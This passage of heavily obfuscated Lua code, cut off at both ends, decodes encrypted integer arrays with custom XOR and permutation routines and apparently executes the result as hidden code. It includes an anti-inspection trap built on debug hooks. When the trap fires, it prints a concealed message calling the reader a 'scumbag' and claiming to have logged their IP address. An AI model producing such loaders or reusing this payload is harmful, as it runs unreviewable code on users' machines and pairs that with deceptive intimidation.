  557, 668, 1086, 684, 729, 709, 1094, 779, 1127, 864, 837, 813, 580, 674, 1212, 1089, 858, 988, 691, 760, 856, 1011,
  548, 693, 1058, 641, 1002, 625, 1195, 825, 1013, 935, 700, 1003, 959, 676, 754, 741, 639, 612, 1168, 1131, 1100, 1184,
  1183, 656, 846, 1102, 931, 717, 739, 1123, 908, 861, 610, 893, 1097, 1087, 1042, 1197, 1157, 764, 628, 1014, 943, 880,
  1210, 648, 683, 1071, 1035, 1158, 563, 715, 747, 722, 1004, 730, 685, 601, 905, 997, 840, 822, 960, 878, 894, 1174,
  1117, 1120, 1050, 547, 1129, 953, 947, 1085, 1167, 987, 824, 946, 836, 740, 670, 1046, 881, 1169, 1010, 744, 1200,
  1208, 1029, 932, 830, 564, 1104, 769, 860, 999, 750, 901, 963, 606, 1152, 1132, 1040, 1146, 1044, 1198, 576, 996, 1007,
  906, 876, 613, 1162, 941, 1189, 857, 602, 787, 772, 1119, 582, 1026, 1016, 736, 742, 903, 652, 689, 1054, 631, 914,
  928, 993, 916, 973, 1022, 1199, 925, 629, 1145, 1141, 690, 907, 1098, 593, 575, 753, 543, 620, 922, 549, 585, 966, 664,
  599, 755, 658, 986, 711, 622, 756, 845, 603, 1062, 651, 920, 682, 698, 995, 877, 687, 1180, 643, 1080, 570, 964, 899,
  802, 781, 594, 1206, 645, 1202, 655, 1191, 1009, 724, 833, 777, 976, 968, 788, 820, 1136, 780, 938, 718, 979, 1207,
  801, 708, 895, 1055, 808, 1179, 663, 790, 1160, 1115, 1012, 884, 636, 1165, 870, 1051, 743, 838, 1185, 660, 886, 1077,
  980, 891, 816, 1171, 933, 819, 1192, 595, 565, 544, 1175, 727, 574, 662, 828, 1156, 1072, 961, 930, 849, 896, 614, 568,
  1036, 1194, 616, 640, 1031, 1091, 1081, 810, 1196, 560, 745, 809, 1187, 983, 1084, 1211, 1061, 875, 850, 1135, 792,
  965, 1000, 800, 967, 746, 1101, 940, 1161, 578, 1073, 1043, 701, 598, 1063, 738, 952, 929, 644, 675, 1151, 888, 958,
  604, 1110, 1116, 793, 642, 1181, 912, 1079, 1121, 991, 567, 621, -1, 4, 103, 64, 95, 92, 106, 30, 84, 188, 22, 42, 75,
  73, 108, 88, 70, 215, 55, 109, 115, 71, 85, 16, 52, 56, 8, 3, 112, 10, 66, 127, 21, 46, 120, 112, 16, 87, 125, 224, 90,
  8, 165, 16, 163, 3, 72, 77, 67, 79, 100, 73, 119, 102, 143, 58, 80, 71, 198, 81, 75, 50, 124, 183, 72, 80, 76, 237, 53,
  236, 2, 66, 44, 28, 75, 60, 124, 110, 14, 15, 66, 82, 210, 71, 222, 10, 29, 98, 117, 21, 34, 74, 186, 122, 25, 15, 181,
  64, 85, 12, 23, 81, 35, 21, 71, 92, 109, 76, 16, 33, 96, 125, 224, 25, 56, 61, 39, 88, 21, 76, 98, 62, 57, 38, 87, 26,
  23, 39, 22, 91, 64, 40, 4, 123, 6, 123, 13, 201, 25, 97, 88, 5, 66, 114, 66, 64, 214, 112, 48, 54, 4, 27, 91, 146, 7,
  69, 116, 88, 25, 21, 64, 33, 190, 40, 85, 177, 84, 60, 78, 6, 12, 98, 25, 27, 11, 92, 13, 75, 80, 250, 25, 71, 114, 94,
  93, 71, 0, 98, 84, 101, 1, 53, 98, 98, 114, 118, 114, 17, 88, 33, 81, 7, 104, 2, 68, 108, 114, 78, 90, 23, 210, 80, 12,
  65, 53, 18, 229, 63, 34, 16, 153, 114, 16, 90, 101, 10, 14, 98, 129, 62, 73, 112, 230, 55, 225, 60, 101, 36, 8, 103,
  16, 77, 72, 107, 192, 85, 76, 40, 9, 227, 114, 126, 101, 151, 7, 225, 93, 23, 3, 94, 16, 100, 155, 90, 7, 97, 68, 84,
  80, 97, 28, 47, 80, 203, 54, 113, 87, 83, 77, 16, 24, 76, 71, 77, 66, 250, 25, 33, 75, 54, 88, 84, 100, 44, 39, 27, 54,
  55, 33, 77, 15, 0, 101, 90, 10, 15, 44, 115, 82, 78, 206, 3, 118, 17, 2, 118, 62, 7, 92, 82, 232, 141, 26, 29, 35, 68,
  46, 65, 31, 105, 6, 32, 92, 25, 115, 87, 57, 123, 24, 32, 42, 78, 26, 191, 36, 74, 18, 123, 16, 16, 59, 11, 5, 114, 7,
  94, 106, 76, 108, 38, 5, 16, 59, 38, 23, 4, 32, 37, 98, 75, 69, 66, 98, 205, 88, 126, 30, 114, 4, 30, 55, 49, 21, 66,
  107, 25, 25, 94, 23, 49, 118, 88, 53, 10, 20, 139, 26, 252, 57, 76, 53, 69, 52, 69, 93, 9, 75, 77, 91, 89, 9, 38, 64,
  118, 82, 38, 5, 14, 25, 114, 181, 9, 114, 91, 46, 38, 39, 15, 167, 25, 64, 114, 98, 73, 6, 145, 242, 39, 23, 75, 142,
  119, 38, 38, 65, 123, 85, 7, 95, 21, 20, 82, 80, 69, 88, 12, 2, 22, 60, 116, 38, 58, 4, 70, 176, 114, 86, 88, 122, 70,
  90, 109, 108, 112, 31, 116, 0, 101, 76, 248, 23, 18, 94, 10, 20, 87, 2, 80, 216, 73, 125, 92, 173, 122, 122, 104, 33,
  203, 19, 113, 3, 72, 39, 74, 29, 125, 72, 86, 71, 63, 21, 119, 109, 31, 85, 2, 26, 44, 23, 98, 22, 90, 244, 110, 66,
  76, 22, 11, 28, 84, 88, 64, 20, 49, 7, 81, 94, 107, 31, 21, 65, 149, 71, 72, 115, 9, 58, 34, 190, 98, 49, 113, 21, 94,
  58, 46, 7, 38, 11, 19, 26, 216, 73, 86, 65, 14, 14, 12, 38, 16, 129, 146, 88, 108, 95, 12, 78, 33, 48, 102, 126, 13,
  165, 185, 33, 13, 48, 90, 114, 60, 119, 51, 72, 88, 118, 119, 68, 80, 3, 80, 122, 37, 10, 76, 93, 72, 69, 96, 87, 71,
  51, 0, 174, 27, 82, 12, 117, 191, 82, 15, 98, 21, 68, 32, 20, 51, 19, 68, 30, 80, 20, 114, 93, 119, 89, 59, 126, 53,
  98, 116, 5, 36, 30, 24, 47, 77, 21, 80, 30, 82, 123, 67, 118, 105, 90, 121, 87, 115, 98, 33, 98, 52, 127, 81, 71, 21,
  76, 105, 10, 21, 14 }, "pzRl0GWg5B9rxR7SbBlpVkuiB5"); skww3inbzv4vZb9yKcNSGL5Oh7Xc0Yk1sBkBArthzPsmZcVuosHrszsaa7lNVXmTWG5 =
n992pPjTzKiDltM91Xc2VtAtUU2JE38X51z4N1ebGs53J8atlSlivcqk; bOEucvmiWRTVSs1Sho3V7FnuYYw0CmenRCTZmmAUGZATXcwTD3sr =
n992pPjTzKiDltM91Xc2VtAtUU2JE38X51z4N1ebGs53J8atlSlivcqk; bkpzb9dx4x2PzFd3sXGVjIZHzo1guRMMPaKpA6Xfa40J8P8THh0beKg6c5XZQP1r0kwDCBi =
bOEucvmiWRTVSs1Sho3V7FnuYYw0CmenRCTZmmAUGZATXcwTD3sr; hA7YJSjRwl8fLv7SiUUCTHpu4ZkJyNnd8ukE257AVX60wP7ItmxZGIZlY9Mey =
bkpzb9dx4x2PzFd3sXGVjIZHzo1guRMMPaKpA6Xfa40J8P8THh0beKg6c5XZQP1r0kwDCBi; oTwARC7NQhuQhRMgECp2Gr6mJ5y1G3ySGUAmPPsgdfErbwPp42fFdVBOnchWGo =
hA7YJSjRwl8fLv7SiUUCTHpu4ZkJyNnd8ukE257AVX60wP7ItmxZGIZlY9Mey; awncqo9OommmXau3BJpA7iqbspi0YGtMI1bb9ymWVX2KHHvPbfLzM =
oTwARC7NQhuQhRMgECp2Gr6mJ5y1G3ySGUAmPPsgdfErbwPp42fFdVBOnchWGo; eU8GUF5OeCQIUdOn9wVZjXOJfvRB8cBF2mm20l3xh390ogt1aRuwamUpnCUMhlQ9A =
awncqo9OommmXau3BJpA7iqbspi0YGtMI1bb9ymWVX2KHHvPbfLzM; bXtFvCt1qjD7y1hXOTnQYB2Zn41FZGCLOr4yuizVpYezjuDadQTuNisZC =
eU8GUF5OeCQIUdOn9wVZjXOJfvRB8cBF2mm20l3xh390ogt1aRuwamUpnCUMhlQ9A; jVQjny5cHlsjFP4tU3nGSOxSYkAJORfvkHdetU7CkeyqgMF7WnYfzy15Y8ypuL =
bXtFvCt1qjD7y1hXOTnQYB2Zn41FZGCLOr4yuizVpYezjuDadQTuNisZC; yu0N3OodqIs6ZLehhZTOrqJ9m4Ehymb1iAv93Ivp79MvNyCrUJFUb =
jVQjny5cHlsjFP4tU3nGSOxSYkAJORfvkHdetU7CkeyqgMF7WnYfzy15Y8ypuL; pjsidCZLn8fGh8kMlxabADGO1y85Koimxujxk1RlYVYuxKJM1fiqF3jmlrr =
yu0N3OodqIs6ZLehhZTOrqJ9m4Ehymb1iAv93Ivp79MvNyCrUJFUb; uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp = function(
  a)
  K, F = 2616423827269455, 16384 + 8089; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; cXak7dkrTHkGEBPOXeNQC8RjI29vJqdMa53d0gtCutv6f7fxselpqwH = function(b)
  co = coroutine.create(b)
  nff34dlyB3e9cV26PxT8E8ik6fGa4Ls4xiacCnIrefVT1RT9X2UCydO1qrkz3BTOzN1U = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(nff34dlyB3e9cV26PxT8E8ik6fGa4Ls4xiacCnIrefVT1RT9X2UCydO1qrkz3BTOzN1U, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return nff34dlyB3e9cV26PxT8E8ik6fGa4Ls4xiacCnIrefVT1RT9X2UCydO1qrkz3BTOzN1U
end; p0AS5cVUZKTtS9YUANtwpPLexcVMORjW0hTggvgVfWZ4XpgdQ5iZJGL = function(f, g)
  xKd4bgGHuOd2WHUXrBUCgSTScDIwboVrB71K0bTDWMfbQmiPYLj9NRbbBZHl6DW1e5Qp9MgEs = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; g3hsLqpMH30oR4qGjW7tb63ZwTBA643MC47PVk4w062JEbHhTIx2vsbCfcmrmBar3EP7IWJo6U = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; mzI41rRRru21H21QEoQWy5DVlfqEpxfMzuTD8bV6EdUyzHLdwh1DZH6MPUQbMnSrXwqUhaREQ5o = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      xKd4bgGHuOd2WHUXrBUCgSTScDIwboVrB71K0bTDWMfbQmiPYLj9NRbbBZHl6DW1e5Qp9MgEs(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; iP7ElvuJzlF1GOk4SPfxuTP9Jxs8ItHvOhSqvOBUz5Qq02HWp2HuN30 = function(p, n)
    eTHBghN78tjNd4GMAYmNTywPYN2bSDSBE8Pk0452FdwAtCS75KnntXF0J8NtFNnNTloGGam = ""
    for k, q in pairs(p) do eTHBghN78tjNd4GMAYmNTywPYN2bSDSBE8Pk0452FdwAtCS75KnntXF0J8NtFNnNTloGGam =
      eTHBghN78tjNd4GMAYmNTywPYN2bSDSBE8Pk0452FdwAtCS75KnntXF0J8NtFNnNTloGGam ..
      pjsidCZLn8fGh8kMlxabADGO1y85Koimxujxk1RlYVYuxKJM1fiqF3jmlrr
      [uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('C5') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('BA') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('D0') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('33') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('FC') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('49')]
      [uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('75') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('3E') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('8B') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('D0')](
      q) end
    ; n(eTHBghN78tjNd4GMAYmNTywPYN2bSDSBE8Pk0452FdwAtCS75KnntXF0J8NtFNnNTloGGam)
  end; g3hsLqpMH30oR4qGjW7tb63ZwTBA643MC47PVk4w062JEbHhTIx2vsbCfcmrmBar3EP7IWJo6U(f,
    function(r) mzI41rRRru21H21QEoQWy5DVlfqEpxfMzuTD8bV6EdUyzHLdwh1DZH6MPUQbMnSrXwqUhaREQ5o(r, g,
        function(s) iP7ElvuJzlF1GOk4SPfxuTP9Jxs8ItHvOhSqvOBUz5Qq02HWp2HuN30(s,
            function(t) if #cXak7dkrTHkGEBPOXeNQC8RjI29vJqdMa53d0gtCutv6f7fxselpqwH(pjsidCZLn8fGh8kMlxabADGO1y85Koimxujxk1RlYVYuxKJM1fiqF3jmlrr[uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('12') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('F1') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('8B') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('6A')]) == 1 then if pjsidCZLn8fGh8kMlxabADGO1y85Koimxujxk1RlYVYuxKJM1fiqF3jmlrr[uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('12') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('F1') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('8B') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('6A')] == pjsidCZLn8fGh8kMlxabADGO1y85Koimxujxk1RlYVYuxKJM1fiqF3jmlrr[uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('E6') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('D0') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('33') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('FC') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('BA')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if pjsidCZLn8fGh8kMlxabADGO1y85Koimxujxk1RlYVYuxKJM1fiqF3jmlrr[uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('12') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('F1') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('8B') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('6A')](t) then
                    pjsidCZLn8fGh8kMlxabADGO1y85Koimxujxk1RlYVYuxKJM1fiqF3jmlrr
                        [uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('12') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('F1') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('8B') .. uElms7HWMr3VeIbQBeI5bMfuImTQBpxNnWhPcUENIvx0i8HB5C1SwjYGmvVp('6A')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; p0AS5cVUZKTtS9YUANtwpPLexcVMORjW0hTggvgVfWZ4XpgdQ5iZJGL(
{ 745, 682, 630, 1021, 1169, 1175, 1004, 1095, 560, 780, 972, 889, 904, 577, 549, 974, 1055, 550, 1132, 597, 555, 924,
  770, 1035, 1186, 619, 547, 1143, 778, 907, 926, 1185, 636, 749, 781, 1002, 708, 1157, 879, 616, 943, 852, 1212, 1162,
  1078, 790, 983, 1153, 759, 935, 1042, 697, 601, 900, 644, 840, 681, 873, 620, 934, 786, 1112, 1063, 902, 657, 693, 846,
  949, 1138, 593, 581, 802, 1202, 929, 1139, 743, 988, 1178, 979, 558, 777, 699, 614, 1024, 772, 800, 605, 1130, 606,
  875, 1001, 676, 991, 1200, 958, 975, 654, 735, 706, 948, 1054, 801, 858, 591, 1100, 787, 634, 851, 1027, 588, 763,
  1020, 1066, 1187, 1164, 1009, 996, 805, 853, 689, 785, 995, 898, 933, 1140, 1008, 626, 1146, 552, 1182, 1036, 1058,
  642, 580, 817, 876, 911, 1165, 1120, 1033, 946, 982, 583, 1075, 1030, 625, 793, 760, 927, 703, 1111, 627, 1103, 966,
  559, 768, 965, 587, 573, 1034, 1093, 1037, 655, 842, 1083, 1122, 878, 637, 855, 901, 691, 656, 1048, 866, 731, 956,
  1045, 953, 730, 1183, 862, 754, 1207, 553, 648, 710, 912, 890, 823, 896, 829, 1113, 845, 571, 923, 913, 833, 1051,
  1108, 1167, 1090, 1089, 675, 932, 865, 819, 674, 773, 769, 729, 1196, 828, 579, 1149, 680, 1016, 1057, 795, 596, 874,
  1148, 663, 850, 1056, 646, 638, 544, 847, 886, 1179, 1150, 807, 919, 957, 776, 698, 891, 861, 641, 592, 1025, 834, 755,
  704, 1127, 690, 1166, 909, 936, 624, 1115, 1170, 806, 1133, 1177, 683, 572, 709, 570, 1014, 1080, 1069, 843, 633, 756,
  993, 668, 1028, 1015, 1022, 1018, 967, 818, 884, 543, 1026, 811, 602, 961, 611, 977, 679, 584, 667, 1044, 1092, 615,
  746, 922, 736, 629, 705, 1141, 810, 1107, 1159, 994, 561, 594, 1123, 1135, 738, 714, 695, 1203, 1074, 950, 839, 548,
  894, 669, 701, 978, 1199, 1005, 621, 882, 727, 643, 897, 976, 1209, 969, 628, 973, 1081, 783, 864, 1013, 906, 711,
  1023, 955, 715, 838, 984, 937, 1088, 1067, 1046, 762, 752, 716, 1180, 999, 1129, 653, 688, 1077, 1101, 1163, 775, 713,
  589, 1061, 814, 724, 607, 1032, 574, 789, 825, 712, 794, 1087, 678, 1118, 751, 791, 1114, 590, 650, 556, 987, 1136,
  652, 808, 1039, 931, 799, 820, 779, 941, 1116, 1193, 1160, 867, 1038, 766, 1174, 1191, 989, 575, 612, 1206, 1104, 673,
  1059, 888, 1040, 672, 1068, 964, 986, 812, 764, 1012, 565, 557, 1094, 830, 832, 639, 872, 826, 700, 947, 1049, 767,
  788, 821, 782, 1091, 970, 739, 733, 585, 617, 1190, 939, 622, 1208, 645, 1124, 723, 827, 1126, 1070, 944, 1098, 792,
  914, 771, 925, 554, 822, 757, 1110, 940, 562, 1010, 758, 928, 1198, 1134, 860, 1000, 981, 1050, 1119, 694, 1184, 959,
  1086, 546, 1131, 954, 740, 582, 696, 1168, 658, 880, 665, 841, 992, 798, 1172, 1084, 920, 1003, 609, 945, 968, 1097,
  613, 816, 910, 1019, 684, 578, 632, 692, 1064, 1053, 774, 1192, 1155, 893, 720, 1071, 1099, 586, 849, 1076, 744, 563,
  796, 963, 1171, 651, 576, 869, 1041, 677, 610, 1176, 918, 1031, 569, 871, 1062, 1007, 702, 887, 1144, 1125, 997, 985,
  640, 885, 1181, 728, 1201, 1156, 856, 545, 753, 1128, 1011, 765, 998, -1, 87, 35, 126, 43, 24, 97, 67, 59, 105, 54, 87,
  76, 22, 19, 27, 9, 126, 123, 62, 58, 88, 123, 43, 158, 253, 96, 119, 49, 111, 58, 75, 71, 9, 44, 42, 105, 86, 39, 28,
  89, 88, 44, 88, 19, 80, 37, 90, 73, 56, 50, 43, 84, 122, 88, 127, 171, 229, 75, 81, 36, 209, 57, 86, 29, 98, 39, 111,
  3, 49, 39, 38, 11, 25, 111, 104, 82, 35, 13, 48, 81, 185, 64, 19, 44, 86, 44, 1, 9, 124, 24, 50, 5, 149, 2, 124, 104,
  107, 44, 0, 3, 66, 76, 61, 121, 197, 85, 8, 94, 56, 104, 91, 83, 88, 75, 12, 95, 86, 124, 97, 227, 69, 76, 99, 28, 76,
  1, 32, 240, 24, 0, 0, 96, 4, 111, 89, 0, 0, 92, 23, 53, 2, 71, 67, 1, 50, 14, 14, 32, 21, 114, 39, 7, 43, 76, 46, 17,
  117, 51, 37, 48, 57, 67, 126, 70, 74, 26, 93, 114, 83, 49, 18, 55, 71, 29, 200, 165, 165, 73, 61, 7, 83, 83, 180, 51,
  55, 95, 66, 113, 84, 78, 75, 230, 101, 60, 114, 15, 19, 50, 4, 30, 20, 104, 123, 21, 221, 246, 120, 86, 104, 48, 97,
  123, 64, 75, 17, 69, 38, 59, 140, 24, 28, 27, 88, 62, 76, 112, 73, 60, 95, 78, 100, 69, 111, 5, 22, 2, 104, 31, 19, 99,
  65, 205, 121, 90, 2, 117, 105, 106, 69, 55, 43, 56, 66, 111, 120, 19, 90, 38, 24, 38, 202, 126, 38, 21, 74, 88, 87,
  116, 48, 95, 243, 104, 232, 23, 69, 13, 31, 121, 69, 38, 93, 122, 24, 114, 127, 114, 6, 20, 253, 73, 10, 49, 135, 134,
  57, 105, 9, 54, 78, 115, 2, 217, 84, 91, 39, 136, 75, 18, 51, 90, 66, 13, 95, 93, 107, 60, 127, 61, 7, 117, 47, 83,
  101, 122, 59, 88, 91, 168, 81, 17, 34, 44, 36, 40, 20, 75, 114, 69, 249, 29, 223, 61, 61, 68, 11, 71, 56, 100, 28, 170,
  1, 93, 35, 108, 116, 91, 59, 16, 99, 104, 127, 42, 213, 104, 125, 183, 59, 72, 66, 73, 124, 119, 178, 42, 6, 17, 63,
  104, 10, 83, 74, 1, 75, 16, 91, 27, 88, 206, 18, 64, 101, 63, 84, 66, 114, 102, 111, 7, 83, 90, 18, 38, 18, 17, 30, 11,
  9, 89, 73, 183, 84, 38, 22, 110, 31, 126, 68, 240, 22, 151, 94, 66, 67, 31, 43, 90, 25, 116, 60, 12, 29, 15, 100, 91,
  25, 93, 1, 101, 22, 38, 17, 24, 20, 40, 75, 114, 17, 160, 15, 116, 32, 88, 117, 10, 116, 3, 78, 26, 20, 8, 88, 28, 24,
  200, 76, 109, 43, 84, 39, 45, 83, 34, 28, 115, 41, 29, 22, 49, 39, 24, 98, 44, 27, 28, 69, 57, 80, 83, 88, 22, 75, 121,
  86, 123, 118, 24, 111, 14, 33, 114, 17, 124, 17, 69, 22, 96, 111, 60, 93, 226, 81, 51, 60, 90, 78, 3, 116, 246, 121,
  69, 31, 119, 245, 86, 23, 60, 12, 4, 78, 169, 51, 43, 63, 88, 22, 17, 97, 3, 61, 138, 31, 88, 248, 93, 21, 62, 122, 66,
  78, 39, 66, 106, 57, 61, 60, 92, 116, 81, 66, 101, 125, 42, 162, 170, 29, 117, 205, 49, 17, 5, 76, 100, 118, 98, 155,
  76, 60, 69, 202, 76, 111, 45, 66, 22, 90, 121, 32, 24, 65, 83, 43, 25, 84, 88, 10, 121, 110, 31, 76, 134, 10, 39, 209,
  86, 231, 23, 114, 38, 224, 185, 11, 1, 59, 18, 97, 50, 69, 8, 195, 43, 88, 11, 116, 12, 111, 69, 3, 103, 21, 75, 128,
  50, 44, 44, 90, 112, 1, 55, 28, 93, 9, 39, 49, 49, 75, 184, 224, 88, 5, 9, 80, 176, 34, 64, 164, 32, 69, 82, 99, 83, 7,
  192, 55, 69, 86, 21, 14, 132, 211, 121 }, "qelUeCnT3kxHxO2zYHsB6gI8RW"); fEBTK8IudEYVRlia1HMSS2l0Dd53Iz6dUiD5U3eGIIwLok8ktSoqLJxWwJfRvKM3hCufatc =
pjsidCZLn8fGh8kMlxabADGO1y85Koimxujxk1RlYVYuxKJM1fiqF3jmlrr; k5tGfmbBzlLhdrBFdZ7AtFE2giDBxJQ7hGINyilIwhTEgqg90eW =
pjsidCZLn8fGh8kMlxabADGO1y85Koimxujxk1RlYVYuxKJM1fiqF3jmlrr; eHcY7fbexz3khewk6YGL3kqGPWzmA52Y66EySjU74LSY03vazUu5hzSKnUpldma0O8Q =
k5tGfmbBzlLhdrBFdZ7AtFE2giDBxJQ7hGINyilIwhTEgqg90eW; kzH4BEliXfJSU8CA2wwolI41dNYArfv7zcy5Pi88XlH6vBED8WBx1XGNnJMA =
eHcY7fbexz3khewk6YGL3kqGPWzmA52Y66EySjU74LSY03vazUu5hzSKnUpldma0O8Q; wmMVjd23moiQuarkDiTLXeysN8jPeMyzLUvjY9eTQmFDnG7nGDFbZ =
kzH4BEliXfJSU8CA2wwolI41dNYArfv7zcy5Pi88XlH6vBED8WBx1XGNnJMA; mz5dw8nmTfpAhsWRMtM7LiBgEfshoU56zcVcMGFmmN0u51ATi34LS =
wmMVjd23moiQuarkDiTLXeysN8jPeMyzLUvjY9eTQmFDnG7nGDFbZ; ciCuaKDhMjWiaoXtGPtvmLA2MfDdLoA8bFiHcNDzBfePDc3XEXRa5OpU5CZlXDMerYCTU4cvsI =
mz5dw8nmTfpAhsWRMtM7LiBgEfshoU56zcVcMGFmmN0u51ATi34LS; tKpuO9nRrgNowRyz4iHtoH3wQtVvuVtkrT1EM28e4ao3gc8v2HyTwC9cxnGzTUG0KCI1 =
ciCuaKDhMjWiaoXtGPtvmLA2MfDdLoA8bFiHcNDzBfePDc3XEXRa5OpU5CZlXDMerYCTU4cvsI; toIXnxkn1QeM7qhKTxgs7JgvDQrPhjF0BO9qbFS0dUWsbx5qMbLJZ =
